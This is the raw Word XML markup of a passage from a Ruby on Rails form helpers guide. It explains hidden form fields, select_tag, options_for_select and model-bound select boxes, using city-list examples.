                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="hidden"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="&amp;#x2713;"</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6A599BF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name="authenticity_token"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="hidden"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="f755bb0ed134b76c432144748a6d4b7a7ddf2b71"</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0AC1988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&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4005D45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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1BAA9EA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When parsing POSTed data, Rails will take into account the special </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_method</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter and acts as if the HTTP method was the one specified inside it (“PATCH” in this example).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B94BA9D"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3 Making Select Boxes with Ease</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C80C5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Select boxes in HTML require a significant amount of markup (one </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>OPTION</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> element for each option to choose from), therefore it makes the most sense for them to be dynamically generated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8EA12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Here is what the markup might look like:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4560"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="616DA0B2" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="06C9217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&lt;select</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="city_id"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="city_id"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D14E8F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&lt;option</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="1"&gt;Lisbon&lt;/option&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5639D0F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&lt;option</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="2"&gt;Madrid&lt;/option&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0312D5E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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04A397B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&lt;option</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="12"&gt;Berlin&lt;/option&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12FF265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&lt;/select&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="45BAAED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Here you have a list of cities whose names are presented to the user. Internally the application only wants to handle their IDs so they are used as the options’ value attribute. Let’s see how Rails can help out here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D2F628"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3.1 The Select and Option Tags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293A13E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most generic helper is </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, which — as the name implies — simply generates the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>SELECT</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tag that encapsulates an options string:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="74081AC1" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="341A67AD" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2102027199"/>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select_tag(:city_id, '&lt;option value="1"&gt;Lisbon&lt;/option&gt;...') %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75F7662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This is a start, but it doesn’t dynamically create the option tags. You can generate option tags with the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7440"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="68896E4A" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F17ED8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options_for_select([['Lisbon', 1], ['Madrid', 2], ...]) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43FFD61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48C4205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output:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2719A57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1DED836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&lt;option</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="1"&gt;Lisbon&lt;/option&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BD5B5B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&lt;option</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="2"&gt;Madrid&lt;/option&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10AA18E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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7B59051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first argument to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a nested array where each element has two elements: option text (city name) and option value (city id). The option value is what will be submitted to your controller. Often this will be the id of a corresponding database object but this does not have to be the case.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2124448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Knowing this, you can combine </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to achieve the desired, complete markup:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="41630734" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0764CEED" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="44524695"/>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select_tag(:city_id, options_for_select(...)) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F183D1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options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> allows you to pre-select an option by passing its value.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="12AF57FD" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2FEB939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options_for_select([['Lisbon', 1], ['Madrid', 2], ...], 2) %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B89B63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6D21065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output:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26FD433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5D07BE4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&lt;option</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="1"&gt;Lisbon&lt;/option&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D1BF0A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&lt;option</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="2"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>selected="selected"&gt;Madrid&lt;/option&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03EC135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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6BCF34C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Whenever Rails sees that the internal value of an option being generated matches this value, it will add the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>selected</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attribute to that option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072905D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second argument to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> must be exactly equal to the desired internal value. In particular if the value is the integer 2 you cannot pass “2” to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — you must pass 2. Be aware of values extracted from the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hash as they are all strings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD20F00"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3.2 Select Boxes for Dealing with Models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5496638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In most cases form controls will be tied to a specific database model and as you might expect Rails provides helpers tailored for that purpose. Consistent with other form helpers, when dealing with models you drop the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> suffix from </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">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8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="39ACA13D" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28759E9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controller:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4351F18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@person</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Person.new(:city_id</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 2)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7A31A80A" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2EB2740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view:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F1A2CB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select(:person, :city_id, [['Lisbon', 1], ['Madrid', 2], ...]) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E087FB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Notice that the third parameter, the options array, is the same kind of argument you pass to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
